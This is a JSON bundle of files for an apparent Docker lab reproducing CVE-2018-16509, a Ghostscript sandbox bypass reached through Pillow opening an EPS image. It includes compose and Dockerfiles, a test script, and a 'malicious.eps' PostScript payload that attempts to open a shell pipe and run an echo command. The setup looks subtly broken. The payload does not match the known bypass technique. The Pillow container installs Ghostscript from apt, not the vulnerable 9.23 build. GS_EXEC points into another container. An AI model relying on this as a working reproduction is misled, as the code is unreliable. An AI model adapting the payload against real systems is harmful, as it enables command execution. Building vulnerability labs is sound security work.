{
    "files": [
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/docker-compose.yml",
            "content": "version: '3.7'\n\nservices:\n  ghostscript:\n    build: ./ghostscript\n    container_name: ghostscript_service\n    networks:\n      - app-network\n\n  pillow_app:\n    build: ./pillow_app\n    container_name: pillow_service\n    volumes:\n      - ./pillow_app:/app\n    depends_on:\n      - ghostscript\n    command: python3 /app/test_script.py\n    environment:\n      - GS_EXEC=/usr/local/bin/gs\n    links:\n      - ghostscript\n    networks:\n      - app-network\n\nnetworks:\n  app-network:\n    driver: bridge\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/ghostscript/Dockerfile",
            "content": "FROM ubuntu:18.04\n\nRUN apt-get update && \\\n    apt-get install -y wget && \\\n    wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz && \\\n    tar -xzf ghostscript-9.23-linux-x86_64.tgz && \\\n    mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && \\\n    rm -rf ghostscript-9.23-linux-x86_64.tgz ghostscript-9.23-linux-x86_64\n\nCMD [\"gs\", \"--version\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/pillow_app/Dockerfile",
            "content": "FROM python:3.6\n\nWORKDIR /app\n\nCOPY requirements.txt requirements.txt\nRUN pip install --no-cache-dir -r requirements.txt\n\nCOPY test_script.py test_script.py\nCOPY malicious.eps malicious.eps\n\n# Ensure Ghostscript is installed and accessible\nRUN apt-get update && \\\n    apt-get install -y ghostscript\n\nCMD [\"python3\", \"test_script.py\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/pillow_app/requirements.txt",
            "content": "Pillow==5.2.0\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/pillow_app/test_script.py",
            "content": "from PIL import Image\nimport os\n\n# This script will attempt to open a malicious EPS file using Pillow\n\ndef process_image():\n    try:\n        with Image.open(\"malicious.eps\") as img:\n            img.load()\n    except Exception as e:\n        print(f\"Error processing image: {e}\")\n\nif __name__ == \"__main__\":\n    process_image()\n"
        },
        {
            "location": "./../../dockers/CVE-2018-16509/custom_no_tool/pillow_app/malicious.eps",
            "content": "%!PS\n(currentfile) (r) file /myshell exch def\nmyshell (w) file\nsystemdict /pipe known { (sh) (r) file } if\n/myshell exch def\nmyshell (echo Vulnerable to CVE-2018-16509) writestring\nmyshell closefile\n"
        }
    ],
    "directory_tree": "CVE-2018-16509/\n\u2514\u2500\u2500 custom_no_tool\n    \u251c\u2500\u2500 docker-compose.yml\n    \u251c\u2500\u2500 ghostscript\n    \u2502   \u2514\u2500\u2500 Dockerfile\n    \u2514\u2500\u2500 pillow_app\n        \u251c\u2500\u2500 Dockerfile\n        \u251c\u2500\u2500 malicious.eps\n        \u251c\u2500\u2500 requirements.txt\n        \u2514\u2500\u2500 test_script.py\n"
}